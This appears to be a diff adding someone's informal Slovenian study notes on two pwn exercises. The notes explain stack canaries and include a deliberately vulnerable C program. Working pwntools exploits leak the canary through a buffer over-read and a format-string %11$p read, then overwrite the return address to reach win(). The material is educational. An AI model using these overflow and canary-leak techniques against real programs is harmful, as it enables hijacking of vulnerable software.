@@ -1,0 +1,196 @@
+PWN 1
+---------------
+
+cannary zazna če stvari prepisujemo (dodatna vrednost, ki se nastavi in pred uporabo problematičnih stvari se pogleda, če je enak)
+
+cannary damo pod base pointer (med bufferjem in podatkih, ki jih nesmemo spreminjat (ret address, base pointer) pač zato more bit umes ane da se vid če smo spreminjal podatke ki jih nebi smel)
+
+v startu usake funkcije se cannary nastavi -> recimo
+
+void t() {
+	//canarry nastavi
+
+
+	//vmesna koda
+
+	//check cannary (pred returnom)
+	return -> leave in ret v assembly (ret pobere iz stacka return address in skoči tja (pop rip), leave pa base pointer vzame (pop rbp))
+}
+
+kako je cannary nastavljen? 7 random bytov ima. V FS register (register za procese) se nastavi kanarcek na odmiku 0x28 in potem shrani v rax in pol se to nastav v naše polje za kanarcka z mal odmika od base pointerja naprej in je za celo delovanje enak v FS registru. torej check bi naredu da je kanarcek FS isti kokr kanarcek na stacku 
+
+stack smashing -> pokvariš kanarčka
+
+ce ful velik A.jev naspammas pol se bo buffer v celoti zafilu in nebomo končal z \0 in loh neke random ass podatke začneš izpisovat, dokler do naslednjega \0 ne naletiš
+
+read -sistemski klic, ni isto kokr v C-ju k mamo knjiznico za branje in se pol preslika v ustrezno arhitekturo za njihove sistemske klice( za linux, windows..)
+
+read ima file decriptor, kok veliko...
+fd: 0 -stdin, 1- stdout, 2 -stdeer
+
+read(0, buffer, 0x64) -> 0 stdin, podatki, velikost
+
+canary ima 7B random, 1B je 0. če mamo buffer z 64B podatkov in use zafilamo, hocmo print koncat ane ko pridemo skoz, zato so tam \0
+
+#include <stdio.h>
+#include <unistd.h>
+
+void win() {
+        printf("You win!\n");
+}
+
+int main() {
+        setbuf(stdin, NULL);
+        setbuf(stdout, NULL);
+
+        char buffer[64];
+
+        printf("Enter your buffer: ");
+        read(0, buffer, 0x64);
+
+        printf("Hello, %s! What's your surname?\n", buffer);
+        read(0, buffer, 0x64);
+
+        printf("Got it, %s!\n", buffer);
+
+        return 0;
+}
+
+kaj je problem?
+
+read prebere do 100B (0x64), buffer je pa samo 64B velik. Zato loh čez buffer pišemo. sam ce zdej kej probamo bomo cannary povozil in bomo izvedl stack smashing.
+zato prepisemo samo zadnji bytek od cannary in bomo se kej vec izpisal
+
+
+mamo skripto k posle 32 A
+
+x/20gx $rsp -> izpisi na ekran 20B, gx pa 64bit pointerje izpise, $rsp je pa stack pointer -> 10x2 64b izpisov
+
+gremo preden se prvi setbuf izvede in s tem ukazom izpisemo stack
+
+in vidmo kje je return addr, en prej bo base pointer in še en prej loh vidš kanarcka (z 00 konca)
+
+gremo še do reada
+
+in vidmo da je 32 A-jev in še en a vidmo, k je newline ('0a' v hex vidmo v little endian) torej dejansko 33 A-jev 
+
+kok jih pol rabmo? še 32 pa še 8 in pol se bo newline spushal v cannary. 72 jih rabmo torej
+
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+p.sendline(b'A' * 72)
+
+p.interactive()
+
+glej slikO!!!
+
+vidimo da torej smo prebral še neki naprej po stacku -> iz base pointerja
+
+zato zdej prebermo eno vrstico k je itak naši A-ji (ker se konca z \n sam tisto vzamemo) pol pa v leak shranmo v novo spremen in dodamo 00
+
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+p.sendline(b'A' * 72)
+
+p.recvline()
+leak = p.recvline()
+leak = u64(b"\x00" + leak[:7]) # ker je little endian gre damo na zacetek 00 pa pripopamo še leak zraven
+print("Canary: ", hex(leak))
+
+
+p.interactive()
+
+in KER ŠE NISMO KONČAL PROGRAMA LOH TA NAŠ CANNARY NOTR PORINEMO
+
+nova koda (v disass win vidmo kje je)
+
+rom pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+p.sendline(b'A' * 72)
+
+p.recvline()
+leak = p.recvline()
+leak = u64(b"\x00" + leak[:7]) # ker je little endian gre damo na zacetek 00 pa pripopamo še leak zraven
+print("Canary: ", hex(leak))
+
+payload = b'A' * 72
+payload += p64(leak)
+payload += b'B' * 8
+payload += p64(0x401166)
+p.sendline(payload)
+
+
+p.interactive()
+
+cannary se je spremenu AMPAK, funkcije se nismo koncal in mi ta payload nabijemo k bo nazaj cannary nastavil, base pointer in ret addr pa bo spremenjen
+
+PWN 2
+
+------------------------
+
+pwn checksec main - komanda ki pogleda varnost programa (vidis da canary je nastavljen za pwn2)
+
+spet mamo gets -> malo drugace, ker ta nam ne bo \n ampak bo \0, torej ne bomo mogl izpisat canarya
+problem tudi v printf -> nima formata podanga, kar pomen da bo izpisal tisto kar mu bomo notr dal
+ce damo recimo sam %p notr v gets se bo izpisal nek pointer, sam nimamo pojma koj kurac je to
+
+kako sploh zgleda print?
+print(format, …… ?) nevemo kok je teh argumentov in formatov sploh
+vararg je to (variabilni argumenti, nevem kok jih je in kaj so)
+why this a problem? argumenti se pošiljajo funkcijam? preko registrov
+
+kaj pol za nas pomeni %p? od kje je dobil ta pointer? nekje na stacku (ker argumenti, ki bi jih pricakoval, so na stacku.)
+
+če jih ful naspammaš %pjev boš začel po stacku gor skakat in boš kmal vidu da si do svojih %p prisel (buffer) ko si plezal
+
+vidmo da rabmo cez 8 ponterjev it, da prilezemo do svojih %p-jev (nasega inputa v sam program(buffer))
+
+%8$p - 8 jih skipa in izpise pointer (pazi, little endian bo vrnu, kar pomen da to kar bomo dobil je p$8%)
+
+rabimo super orodje da najdemo kanarcka!
+
+z pwn naredimo 
+x/20gx $rsp -> pomaga da vidmo stack, te naši podatki 0x70243825 in vidmo da smo 24B stran (3 pointerji)
+torej namest 8 damo 11
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+p.sendline(b'%11$p')
+
+p.interactive()
+
+
+kok rabmo A-jev? 24
+
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+p.sendline(b'%11$p')
+p.recvuntil(b': ') #to je za tist input
+canary = p.recvline().strip() #da je v pravem bytestring formatu uporabimo int, ker kle dobimo 0x53434310c kurac, mi hocmo pa \x pa to
+canary = int(canary, 16) 
+print("Canary: ", hex(canary))
+p.sendline(b'n')
+
+#isto k prej ker kanarcka mamo
+
+payload = b'A' * 24
+payload +=p64 (canary)
+payload += b'B' * 8
+payload += p64(0x401176)
+p.sendline(payload)
+p.sendline(b'y')
+p.interactive()
+
+
+
+
+
